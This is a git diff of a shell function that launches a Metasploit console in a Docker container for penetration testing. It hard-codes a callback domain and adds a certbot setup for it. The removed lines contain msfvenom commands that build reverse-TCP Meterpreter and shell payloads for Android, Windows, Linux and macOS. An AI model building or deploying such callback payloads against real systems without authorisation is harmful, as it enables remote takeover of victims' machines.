@@ -1,9 +1,10 @@
 alias msfconsole='msf_start'
+
 function msf_start() {
 tmuxwindowname=$(tmux display-message -p '#W')
 tmux rename-window -t${TMUX_PANE} "msf"
 tmuxwindownamebuild=$(tmux display-message -p '#W')
-while getopts d:n:p:huawlo option
+while getopts d:n:p:hu option
 do
 	case "${option}" in
 		d)
@@ -11,29 +12,13 @@ do
 			;;
 		n) 
 			netiface=${OPTARG}
-			hostip="$(ipconfig getifaddr $netiface)"
+			hostip="ninjacloud.net"
 			;;
 		p) 
 			exploitport=$OPTARG
 			;;
 		u)
 			shellupgradeport=$OPTARG
-			;;
-		a)
-			andpay=1
-			tmuxwindownamebuild=$(echo $tmuxwindownamebuild)" [android]"
-			;;
-		w)
-			winpay=1
-			tmuxwindownamebuild=$(echo $tmuxwindownamebuild)" [win]"
-			;;
-		l)
-			linpay=1
-			tmuxwindownamebuild=$(echo $tmuxwindownamebuild)" [lin]"
-			;;
-		o)
-			osxpay=1
-			tmuxwindownamebuild=$(echo $tmuxwindownamebuild)" [osx]"
 			;;
 		h)
 			echo "msfconsole docker image start script help"
@@ -42,9 +27,6 @@ do
 			echo "-n	<Network iface>"
 			echo "-p	<Lisener Port>"
 			echo "-u	<Shell Upgrade Port>"
-			echo "-w	<Windows Reverse Lisener>"
-			echo "-l	<Linux Reverse Lisener>"
-			echo "-o	<OSX Reverse Lisener>"
 			tmux rename-window -t${TMUX_PANE} $tmuxwindowname
 			return 0
 			;;
@@ -68,61 +50,9 @@ msf="$(docker run -d -t \
 	-v $desktopfolder:/pentest/Desktop \
 	pennoser/production:latest /bin/bash)"
 
-# build basic reverse payloads for host
-if [ -n "$andpay" ]; then
-	docker exec -ti $msf msfvenom \
-		-p "android/meterpreter/reverse_tcp" \
-		"LHOST=$hostip" \
-		"LPORT=$exploitport" \
-		-o "/pentest/Desktop/shell.apk"
-fi
-if [ -n "$winpay" ]; then
-	docker exec -ti $msf msfvenom \
-		-p "windows/meterpreter/reverse_tcp" \
-		"LHOST=$hostip" \
-		"LPORT=$exploitport" \
-		-f "exe" \
-		-o "/pentest/Desktop/shell.exe"
-fi
-if [ -n "$linpay" ]; then
-	docker exec -ti $msf msfvenom \
-		-p "linux/x86/meterpreter/reverse_tcp" \
-		"LHOST=$hostip" \
-		"LPORT=$exploitport" \
-		-f "elf" \
-		-o "/pentest/Desktop/shell"
-	docker exec -ti $msf /bin/bash \
-		-c "chmod +x /pentest/Desktop/shell"
-fi
-if [ -n "$osxpay" ]; then
-	docker exec -ti $msf msfvenom \
-		-p "osx/x86/shell_reverse_tcp" \
-		"LHOST=$hostip" \
-		"LPORT=$exploitport" -f \
-		"macho" -o "/pentest/Desktop/shell.command"
-	docker exec -ti $msf /bin/bash \
-		-c "chmod +x /pentest/Desktop/shell.command"
-fi
-
 # setup msfconsole startup
 docker exec -t $msf /bin/bash \
 	-c "echo alias upgrade 'use post/multi/manage/shell_to_meterpreter LPORT=$shellupgradeport' >> /root/.msf4/msfconsole.rc"
-docker exec -t $msf /bin/bash \
-	-c "echo set lport $exploitport >> /root/.msf4/linpay.rc"
-docker exec -t $msf /bin/bash \
-	-c "echo exploit -j >> /root/.msf4/linpay.rc"
-docker exec -t $msf /bin/bash \
-	-c "echo set lport $exploitport >> /root/.msf4/winpay.rc"
-docker exec -t $msf /bin/bash \
-	-c "echo exploit -j >> /root/.msf4/winpay.rc"
-docker exec -t $msf /bin/bash \
-	-c "echo set lport $exploitport >> /root/.msf4/osxpay.rc"
-docker exec -t $msf /bin/bash \
-	-c "echo exploit -j >> /root/.msf4/osxpay.rc"
-docker exec -t $msf /bin/bash \
-	-c "echo set lport $exploitport >> /root/.msf4/andpay.rc"
-docker exec -t $msf /bin/bash \
-	-c "echo exploit -j >> /root/.msf4/andpay.rc"
 docker exec -t $msf /bin/bash \
 	-c "echo clear >> /root/.msf4/msfconsole.rc"
 docker exec -t $msf /bin/bash \
@@ -130,7 +60,10 @@ docker exec -t $msf /bin/bash \
 
 # setup Apache
 docker exec -t $msf /bin/bash \
-	-c "service apache2 start"
+	-c "service apache2 start \
+	 && chmod 600 /pentest/digitalocean.ini \
+	 && chmod 600 /pentest/digitalocean.ini \
+	 && certbot -n --apache -d ninjacloud.net -d www.ninjacloud.net --reinstall --redirect"
 
 # run msfconsole
 docker exec -ti $msf msf 
